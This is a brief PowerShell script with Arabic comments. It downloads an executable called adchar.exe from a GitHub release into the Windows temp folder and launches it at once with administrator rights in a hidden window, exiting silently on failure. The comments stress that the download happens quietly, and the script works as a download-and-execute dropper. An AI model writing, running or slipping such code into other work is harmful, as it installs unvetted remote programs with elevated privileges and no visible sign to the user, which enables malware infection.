# 1. تحديد الرابط المباشر للملف من GitHub Releases
$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"

# 2. تحديد مسار الحفظ (المجلد المؤقت للويندوز)
$tempPath = "$env:TEMP\adchar_installer.exe"

# 3. تحميل الملف بصمت تام
try {
    Invoke-WebRequest -Uri $url -OutFile $tempPath
    
    # 4. تشغيل الملف فوراً بصلاحيات المسؤول
    Start-Process -FilePath $tempPath -Verb runAs -WindowStyle Hidden
} catch {
    # في حالة فشل التحميل لأي سبب
    exit
}
